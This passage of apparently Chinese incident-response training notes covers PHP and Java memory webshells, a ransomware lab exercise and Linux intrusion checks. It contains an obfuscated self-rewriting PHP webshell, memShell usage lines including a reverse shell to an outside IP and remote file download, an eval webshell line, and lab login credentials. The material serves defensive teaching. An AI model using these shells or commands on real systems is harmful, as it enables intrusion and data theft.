class="hljs-operator">^</span><span class="hljs-string">&quot;-&quot;</span>).(<span class="hljs-string">&quot;[&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;?&quot;</span>).(<span class="hljs-string">&quot;?&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;b&quot;</span>).(<span class="hljs-string">&quot;]&quot;</span><span class="hljs-operator">^</span><span class="hljs-string">&quot;t&quot;</span>));&#125;<br><span class="hljs-operator">?&gt;</span>&#x27;;<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-operator">!</span>file_exists(<span class="hljs-variable">$file</span>)<span class="hljs-operator">||</span>(md5_file(<span class="hljs-variable">$file</span>)<span class="hljs-operator">!==</span><span class="hljs-string">&quot;99d77f6bc7086cc5c2f0b251d567938c&quot;</span>))&#123;<br>    	file_put_contents(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);system(<span class="hljs-string">&quot;/bin/chmod 777 &quot;</span>.<span class="hljs-variable">$file</span>);<span class="hljs-comment">//将字符串写入该文件中</span><br>    &#125;<br>    usleep(<span class="hljs-number">200</span>);<span class="hljs-comment">//延迟执行当前脚本数微秒，即条件竞争</span><br>&#125;<br><span class="hljs-operator">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><code>shell.php</code>执行后会在同级目录下生成<code>.7b34e9981883b1eb6df6c30089d88fb3.php</code>并且删除自身，因为while命令一直在循环，所以打开浏览器时会一直加载，而且删除尝试<code>.7b34e9981883b1eb6df6c30089d88fb3.php</code>时会重新生成一个<code>.7b34e9981883b1eb6df6c30089d88fb3.php</code><br><strong>php内存马的解决</strong></p>
+<ul>
+<li>如果有服务器的root权限：重启中间件之后再删除<code>.7b34e9981883b1eb6df6c30089d88fb3.php</code>即可</li>
+<li>如果没有服务器的root权限：<ol>
+<li>ps auxww|grep shell.php 找到pid后杀掉进程就可以，删掉脚本是起不了作用的，因为php执行的时候已经把脚本读进去解释成opcode运行了</li>
+<li>用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于不死马设置的值。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.shell.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;hi springbird !&#x27;</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .shell.php&#x27;</span>);<br>      <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">100</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ul>
+<h6 id="java内存马"><a href="#java内存马" class="headerlink" title="java内存马"></a>java内存马</h6><p><em>apache-tomcat-9.0.83安装和启动<br>    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar xf apache-tomcat-9.0.83.tar.gz<br><span class="hljs-built_in">cd</span> apache-tomcat-9.0.83/bin<br>./startup.sh<br></code></pre></td></tr></table></figure><br>启动后tomcat默认工作8080端口</em><br><strong><a target="_blank" rel="noopener" href="https://github.com/rebeyond/memShell">内存马</a></strong><br>下载和启动</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">unzip memShell.<span class="hljs-keyword">zip</span><br><span class="hljs-keyword">cd</span> memShell<br>java -jar inject.jar <span class="hljs-comment">//植入内存马</span><br></code></pre></td></tr></table></figure>
+<p>内存马的使用</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dts">anyurl?pass_the_<span class="hljs-attr">world</span><span class="hljs-operator">=</span>pass <span class="hljs-comment">//show this help page.</span><br>anyurl?pass_the_<span class="hljs-attr">world</span><span class="hljs-operator">=</span>pass<span class="hljs-variable">&amp;model</span>=exec<span class="hljs-variable">&amp;cmd</span>=whoami <span class="hljs-comment">//run os command.</span><br>anyurl?pass_the_<span class="hljs-attr">world</span><span class="hljs-operator">=</span>pass<span class="hljs-variable">&amp;model</span>=connectback<span class="hljs-variable">&amp;ip</span>=<span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span><span class="hljs-variable">&amp;port</span>=<span class="hljs-number">51</span> <span class="hljs-comment">//reverse a shell back to 8.8.8.8 on port 51.</span><br>anyurl?pass_the_<span class="hljs-attr">world</span><span class="hljs-operator">=</span>pass<span class="hljs-variable">&amp;model</span>=urldownload<span class="hljs-variable">&amp;url</span>=http:<span class="hljs-comment">//xxx.com/test.pdf&amp;path=/tmp/test.pdf //download a remote file via the victim&#x27;s network directly.</span><br>anyurl?pass_the_<span class="hljs-attr">world</span><span class="hljs-operator">=</span>pass<span class="hljs-variable">&amp;model</span>=list[del|show]<span class="hljs-variable">&amp;path</span>=<span class="hljs-keyword">/etc/</span>passwd <span class="hljs-comment">//list,delete,show the specified path or file.</span><br>anyurl?pass_the_<span class="hljs-attr">world</span><span class="hljs-operator">=</span>pass<span class="hljs-variable">&amp;model</span>=download<span class="hljs-variable">&amp;path</span>=<span class="hljs-keyword">/etc/</span>passwd <span class="hljs-comment">//download the specified file on the victim&#x27;s disk.</span><br>anyurl?pass_the_<span class="hljs-attr">world</span><span class="hljs-operator">=</span>pass<span class="hljs-variable">&amp;model</span>=upload<span class="hljs-variable">&amp;path</span>=<span class="hljs-keyword">/tmp/</span>a.elf<span class="hljs-variable">&amp;content</span>=this_is_content[<span class="hljs-variable">&amp;type</span>=b] <span class="hljs-comment">//upload a text file or a base64 encoded binary file to the victim&#x27;s disk.</span><br>anyurl?pass_the_<span class="hljs-attr">world</span><span class="hljs-operator">=</span>pass<span class="hljs-variable">&amp;model</span>=proxy <span class="hljs-comment">//start a socks proxy server on the victim.</span><br>anyurl?pass_the_<span class="hljs-attr">world</span><span class="hljs-operator">=</span>pass<span class="hljs-variable">&amp;model</span>=chopper <span class="hljs-comment">//start a chopper server agent on the victim.</span><br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://github.com/4ra1n/FindShell">内存马查杀</a><br><code>java -jar FindShell.jar --pid [目标JVM的PID]</code></p>
+<h6 id="隐藏的webshell后门"><a href="#隐藏的webshell后门" class="headerlink" title="隐藏的webshell后门"></a>隐藏的webshell后门</h6><ul>
+<li>文件md5值校验</li>
+<li>diff命令：在 Linux 中，可以使用diff通过快速找出两个项目文件的差异<code>diff -c -a -r cms1 cms2</code>(如果只是想查看两个文件是否不同又不想显示差异之处的话，可以加上 -q 选项)</li>
+</ul>
+<h6 id="版本控制工具"><a href="#版本控制工具" class="headerlink" title="版本控制工具"></a>版本控制工具</h6><p>如git，重新上传代码到 git，add+commit+push，然后打开项目，点击 commits，在历史提交版本里面，查看文件更改内容，很容易就可以发现代码被篡改的地方了。<br>另外，也可以通过 git diff 用来比较文件之间的不同。</p>
+<h6 id="文件对比工具"><a href="#文件对比工具" class="headerlink" title="文件对比工具"></a>文件对比工具</h6><p><a target="_blank" rel="noopener" href="http://www.scootersoftware.com/download.php">Beyond Compare</a><br><a target="_blank" rel="noopener" href="https://winmerge.org/downloads/">Win Merge</a></p>
+<h4 id="下午：应急响应实操练习"><a href="#下午：应急响应实操练习" class="headerlink" title="下午：应急响应实操练习"></a>下午：应急响应实操练习</h4><p>每组一个Windows虚拟机，虚拟机远程桌面密码：Administrator&#x2F;Abc@12345<br>Group1 10.100.2.58<br>Group2 10.100.2.80<br>Group3 10.100.2.82<br>Group4 10.100.2.83<br>Group5 10.100.2.84<br>Group6 10.100.2.86<br>Group7 10.100.2.87<br>Group8 10.100.2.88<br>Group9 10.100.2.89</p>
+<p>【数据被恶意加密场景】<br>模拟某国外黑客组织为达到破坏企业正常运行、非法获利的目的，发起了对省移动XX系统的大规模攻击。通过网络探测进行漏洞利用，成功获取云平台服务器管理员权限，黑客组织在其服务器内植入了勒索病毒，导致核心业务瘫痪，维护人员通过后台查看部分数据库数据被恶意加密。为阻止黑客进一步对其他系统及平台数据进行破坏和渗透，信息安全管理部立即启动应急事件响应流程，组织安全技术人员开展安全事件应急处置。</p>
+<ol>
+<li><p>黑客进入网站后台的时间（格式：YY-MM-DD HH-MM-SS）22-06-09 09-45-54</p>
+ <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">打开IIS(Internet 信息服务管理器-&gt;选择该网站目录-&gt;选择日志并查看网站日志目录-&gt;用文件资源管理器打开目录位置查看日志)-&gt;发现黑客爆破记录，在爆破之后的一条http请求响应码为<span class="hljs-number">302</span>并重定向到网站index页面说明黑客成功登入<br></code></pre></td></tr></table></figure></li>
+<li><p>请提交Webshell文件名：202206090951030702.cer</p>
+ <figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">使用D盾对网站目录进行扫描可以看到D:\web\dtcms\upload\<span class="hljs-number">202206</span>\<span class="hljs-number">09</span>\<span class="hljs-number">202206090951030702.</span>cer为<span class="hljs-keyword">eval</span>后门文件，内容为&lt;%eval request(<span class="hljs-string">&quot;cmd&quot;</span>)%&gt;<br></code></pre></td></tr></table></figure></li>
+<li><p>黑客使用的提权工具的名称: ms15-051_x64.exe</p>
+ <figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">在D:\web\dtcms\upload目录下发现ms15<span class="hljs-string">-051</span>_x64.exe，使用whoami显示iis apppool\dtcms，使用ms15<span class="hljs-string">-051</span>_x64.exe whoami显示nt authority\system<br>并且查看同级目录下的mimikatz.log发现黑客使用mimikatz得到密码，且该文件的创建事件为22<span class="hljs-string">-06</span><span class="hljs-string">-09</span> 10:10:31<br></code></pre></td></tr></table></figure></li>
+<li><p>黑客登录服务器的时间（格式：YY-MM-DD HH-MM-SS）：22-06-09 10-11-01</p>
+ <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">windows</span>事件查看器-&gt;windows日志-&gt;安全-&gt;寻找<span class="hljs-number">22</span>-<span class="hljs-number">06</span>-<span class="hljs-number">09</span> <span class="hljs-number">10</span>:<span class="hljs-number">10</span>:<span class="hljs-number">31</span>之后的登录条目<br></code></pre></td></tr></table></figure></li>
+<li><p>提交被勒索病毒加密的机密文件内容<br> README</p>
+ <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">机密文件已经用随机AES密钥+超级超级大大大大大大的RSA密钥所加密，而且密钥已被统统删掉，乖乖的交赎金吧<br></code></pre></td></tr></table></figure>
+<p> RSA</p>
+ <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">c</span> = m<span class="hljs-regexp"> ^</span> e % n<br>如果n特别大时，则c = m<span class="hljs-regexp"> ^</span> e，即m = c<span class="hljs-regexp"> ^</span> (<span class="hljs-number">1</span>/e)<br></code></pre></td></tr></table></figure>
+<p> 求解aes密钥的代码</p>
+ <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import gmpy2<br>import libnum<br><span class="hljs-selector-tag">g</span> = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;rsa_c&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<span class="hljs-selector-class">.readlines</span>()<br>c = <span class="hljs-built_in">int</span>(<span class="hljs-selector-tag">g</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-attr">[6:]</span>, <span class="hljs-number">16</span>)<br>e = <span class="hljs-number">0</span>x10001<br>m1 = gmpy2<span class="hljs-selector-class">.iroot</span>(c, e)<br>m = libnum<span class="hljs-selector-class">.n2s</span>(<span class="hljs-built_in">int</span>(m1<span class="hljs-selector-attr">[0]</span>))<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(m)</span></span><br></code></pre></td></tr></table></figure>
+<p> 得到aes密钥为FVYbqkMPBFuobTSQQcmAHEutxDJLlnMT<br> <a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">res解密网站</a><br> <a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'UTF8','string':'FVYbqkMPBFuobTSQQcmAHEutxDJLlnMT'%7D,%7B'option':'Hex','string':''%7D,'ECB','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)">res解密配置</a></p>
+</li>
+</ol>
+<h3 id="7-16"><a href="#7-16" class="headerlink" title="7.16"></a>7.16</h3><h4 id="Linux入侵检测"><a href="#Linux入侵检测" class="headerlink" title="Linux入侵检测"></a>Linux入侵检测</h4><p><a target="_blank" rel="noopener" href="https://www.yuque.com/u22103703/csqb9v/owlxi2">雨雀</a></p>
+<h5 id="账号安全"><a href="#账号安全" class="headerlink" title="账号安全"></a>账号安全</h5><p>在linux中系统用户的uid一般在500以内，而额外创建的用户uid在500-100</p>
+<ol>
+<li><p>用户信息文件 &#x2F;etc&#x2F;passwd</p>
+ <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">account:</span><span class="hljs-symbol">password:</span><span class="hljs-variable constant_">UID</span><span class="hljs-symbol">:GID</span><span class="hljs-symbol">:GECOS</span><span class="hljs-symbol">:directory</span><span class="hljs-symbol">:shell</span><br>用户名：密码：用户<span class="hljs-variable constant_">ID</span>：组<span class="hljs-variable constant_">ID</span>：用户说明：家目录：登陆之后的 shell<br>注意：无密码只允许本机登陆，远程不允许登陆<br></code></pre></td></tr></table></figure></li>
+<li><p>影子文件 &#x2F;etc&#x2F;shadow</p>
+ <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">root:</span><span class="hljs-variable">$6</span><span class="hljs-variable">$oGs1PqhL2p3ZetrE</span><span class="hljs-variable">$X7o7bzoouHQVSEmSgsYN5UD4</span>.kMHx6qgbTqwNVC5oOAouXvcjQSt.<span class="hljs-title class_">Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI</span>/<span class="hljs-symbol">:</span><span class="hljs-number">16809</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">99999</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span>:::<br>用户名：经过hash的密码：密码最后一次修改日期和<span class="hljs-number">1970</span>年<span class="hljs-number">1</span>月<span class="hljs-number">1</span>日相差的时间：两次密码的修改时间间隔所需最小天数：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留<br><br>如果为空，则对应用户没有口令，登录时不需要口令；<br>星号代表帐号被锁定，将无法登录；双叹号表示这个密码已经过期了， 如果是<span class="hljs-variable">$x</span><span class="hljs-variable">$xxxxxxxx</span><span class="hljs-variable">$的</span>形式，则代表密码正常。<br><span class="hljs-variable">$6</span><span class="hljs-variable">$开</span>头的，表明是用<span class="hljs-title class_">SHA</span><span class="hljs-number">-512</span>加密的，密文长度<span class="hljs-number">86</span>，示例中‘oGs1PqhL2p3ZetrE’为salt值，是一个随机字符串，供加密使用<br><span class="hljs-variable">$1</span><span class="hljs-variable">$ </span>表明是用<span class="hljs-title class_">MD5</span>加密的，密文长度<span class="hljs-number">22</span>个字符<br><span class="hljs-variable">$2</span><span class="hljs-variable">$ </span>是用<span class="hljs-title class_">Blowfish</span>加密的，<br><span class="hljs-variable">$5</span><span class="hljs-variable">$ </span>是用 <span class="hljs-title class_">SHA</span><span class="hljs-number">-256</span>加密的，密文长度<span class="hljs-number">43</span><br></code></pre></td></tr></table></figure>
+<p> 如果黑客登录的是普通用户test，当发现test用户的uid和gid都变为0时，说明登录test时拥有root权限，也说明电脑一定被入侵了<br> <strong>账号安全常用命令</strong><br> <code>who</code>查看当前登录用户（tty 本地登陆  pts 远程登录）<br> <code>w</code>查看系统信息(当前登录的用户)并查看操作状态<br> <code>uptime</code>查看登陆多久、多少用户，负载状态<br> <strong>入侵排查(账号安全)</strong></p>
+<ol>
+<li>查询特权用户特权用户(uid 为0)<br> <code>[root@localhost ~]# awk -F: &#39;$3==0&#123;print $1&#125;&#39; /etc/passwd</code></li>
+<li>查询可以远程登录的帐号信息<br> <code>[root@localhost ~]# awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow</code></li>
+<li>除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限<br> <code>[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></li>
+<li>禁用或删除多余及可疑的帐号 <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">usermod -L <span class="hljs-keyword">user</span>    <span class="hljs-title">禁用帐号，帐号无法登录，/etc</span>/shadow 第二栏为 ! 开头<br>userdel <span class="hljs-keyword">user</span>       <span class="hljs-title">删除 user</span> 用户<br>userdel -r <span class="hljs-keyword">user</span>    <span class="hljs-title">将删除 user</span> 用户，并且将 /home 目录下的 <span class="hljs-keyword">user</span> <span class="hljs-title">目录一并删除</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h5 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h5><p><code>history</code><br>&#x2F;etc&#x2F;shadow中的密码难以破解，但是用户往往习惯于复制密码，而且可能由于操作不当粘贴到控制台中并执行(命令不存在)，而这一操作会被记录到history中，从而寻找到密码的线索<br>管理员可以根据<code>.bash_history</code>检查是否有入侵痕迹<br>入侵者删除操作痕迹：直接删除<code>.bash_history</code>:管理员发现文件显示则发现已被入侵-&gt;通过<code>sed</code>命令将<code>.bash_history</code>中的某些行删除</p>
+<h5 id="检查异常端口"><a href="#检查异常端口" class="headerlink" title="检查异常端口"></a>检查异常端口</h5><p>使用 netstat 网络连接命令，分析可疑端口、IP、PID:<code>netstat -antlp | more</code><br>查看下 pid 所对应的进程文件路径:<code>ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）</code><br>然后利用ip归属地查询网站和搜索引擎找寻ip线索<br><em>当netstat网络连接进程没有pid时，很有可能是异常进程</em></p>
+<h5 id="检查异常进程"><a href="#检查异常进程" class="headerlink" title="检查异常进程"></a>检查异常进程</h5><p><code>ps aux | grep pid</code></p>
+<h5 id="检查开机启动项"><a href="#检查开机启动项" class="headerlink" title="检查开机启动项"></a>检查开机启动项</h5><p><code>runlevel</code>查看当前运行级别<br>系统默认允许级别</p>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">vi</span>  /<span class="hljs-string">etc</span>/<span class="hljs-string">inittab</span><br><span class="hljs-string">id</span>=<span class="hljs-string">3</span>：<span class="hljs-string">initdefault</span>  <span class="hljs-comment">#系统开机后直接进入哪个运行级别</span><br><br><span class="hljs-string">kali</span>中使用<span class="hljs-string">systemctl</span> <span class="hljs-built_in">get-default查看运行级别</span><br><span class="hljs-string">graphical</span>.<span class="hljs-string">target</span>：启动到图形界面（相当于传统的运行级别 <span class="hljs-string">5</span>）<br><span class="hljs-string">multi-user</span>.<span class="hljs-string">target</span>：启动到多用户模式，没有图形界面（相当于传统的运行级别 <span class="hljs-string">3</span>）<br></code></pre></td></tr></table></figure>
+<p>开机启动配置文件</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/etc/rc.local</span><br><span class="hljs-string">/etc/rc.d/rc</span>[0~6]<span class="hljs-string">.d</span><br></code></pre></td></tr></table></figure>
+<p>例子</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift">当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 <span class="hljs-regexp">/etc/</span><span class="hljs-keyword">init</span>.d 目录下，然后在 <span class="hljs-regexp">/etc/</span>rc.d<span class="hljs-operator">/</span>rc<span class="hljs-operator">*</span>.d 文件中建立软链接即可<span class="hljs-operator">。</span><br>注：此中的 <span class="hljs-operator">*</span> 代表 <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span> 这七个等级<br>root<span class="hljs-meta">@localhost</span> <span class="hljs-operator">~</span>]# ln <span class="hljs-operator">-</span>s <span class="hljs-regexp">/etc/</span><span class="hljs-keyword">init</span>.d<span class="hljs-regexp">/sshd /</span>etc<span class="hljs-regexp">/rc.d/</span>rc3.d<span class="hljs-operator">/</span><span class="hljs-type">S100ssh</span><br>此处sshd是具体服务的脚本文件，<span class="hljs-type">S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的</span><span class="hljs-operator">。</span><br></code></pre></td></tr></table></figure>
+<p>入侵排查(启动项文件)</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">more <span class="hljs-string">/etc/rc.local</span><br><span class="hljs-string">/etc/rc.d/rc</span>[0~6]<span class="hljs-string">.d</span><br><span class="hljs-keyword">ls</span> -l <span class="hljs-string">/etc/rc.d/rc3.d/</span><br></code></pre></td></tr></table></figure>
+<h5 id="检查系统日志"><a href="#检查系统日志" class="headerlink" title="检查系统日志"></a>检查系统日志</h5><p><code>/var/log/secure</code>记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中<br><code>cat secure* | grep Accept</code></p>
+<h4 id="Linux入侵检测工具"><a href="#Linux入侵检测工具" class="headerlink" title="Linux入侵检测工具"></a>Linux入侵检测工具</h4><h5 id="Rootkit查杀"><a href="#Rootkit查杀" class="headerlink" title="Rootkit查杀"></a>Rootkit查杀</h5><p>rootkit可以从内核层面留下后门，而且使用后门连接后不会留下任何入侵和操作痕迹<br>要想知道机器是否中了rootkit只能通过专业的工具<br><a target="_blank" rel="noopener" href="http://www.chkrootkit.org/">chkrootkit</a></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">使用方法：<br>wget ftp:<span class="hljs-regexp">//</span>ftp.chkrootkit.org<span class="hljs-regexp">/pub/</span>seg<span class="hljs-regexp">/pac/</span>chkrootkit.tar.gz<br>tar zxvf chkrootkit.tar.gz<br>cd chkrootkit-<span class="hljs-number">0.58</span>b<br>yum install glibc-static -y<br>make sense<br><span class="hljs-comment">#编译完成没有报错的话执行检查</span><br>./chkrootkit<br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://rkhunter.sourceforge.net/">rkhunter</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">使用方法：<br>wget https:<span class="hljs-comment">//udomain.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.6/rkhunter-1.4.6.tar.gz</span><br>tar -zxvf rkhunter-<span class="hljs-number">1.4</span>.<span class="hljs-number">6</span><span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span><br>cd rkhunter-<span class="hljs-number">1.4</span>.<span class="hljs-number">6</span><br>./installer<span class="hljs-selector-class">.sh</span> <span class="hljs-attr">--install</span><br>rkhunter -c<br></code></pre></td></tr></table></figure>
+<h5 id="病毒查杀工具"><a href="#病毒查杀工具" class="headerlink" title="病毒查杀工具"></a>病毒查杀工具</h5><p><a target="_blank" rel="noopener" href="http://www.clamav.net/download.html">Clamav</a><br>当入侵者和管理员的权限相同时此工具几乎没用<br>安装方式一:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">1、安装 zlib：<br>wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz <br>tar -zxvf  zlib-1.2.7.tar.gz<br><span class="hljs-built_in">cd</span> zlib-1.2.7<br><span class="hljs-comment">#安装一下gcc编译环境： yum install gcc</span><br>CFLAGS=<span class="hljs-string">&quot;-O3 -fPIC&quot;</span> ./configure --prefix= /usr/local/zlib/<br>make &amp;&amp; make install<br><br>2、添加用户组 clamav 和组成员 clamav：<br>groupadd clamav<br>useradd -g clamav -s /bin/false -c <span class="hljs-string">&quot;Clam AntiVirus&quot;</span> clamav<br><br>3、安装 Clamav<br>tar –zxvf clamav-0.97.6.tar.gz<br><span class="hljs-built_in">cd</span> clamav-0.97.6<br>./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib<br>make<br>make install<br><br>4、配置 Clamav<br><span class="hljs-built_in">mkdir</span> /opt/clamav/logs<br><span class="hljs-built_in">mkdir</span> /opt/clamav/updata<br><span class="hljs-built_in">touch</span> /opt/clamav/logs/freshclam.log<br><span class="hljs-built_in">touch</span> /opt/clamav/logs/clamd.log<br><span class="hljs-built_in">cd</span> /opt/clamav/logs<br><span class="hljs-built_in">chown</span> clamav:clamav clamd.log<br><span class="hljs-built_in">chown</span> clamav:clamav freshclam.log<br><br>5、ClamAV 使用：<br> /opt/clamav/bin/freshclam 升级病毒库<br>./clamscan –h 查看相应的帮助信息<br>./clamscan -r /home  扫描所有用户的主目录就使用<br>./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果<br></code></pre></td></tr></table></figure>
+<p>安装方式二:</p>
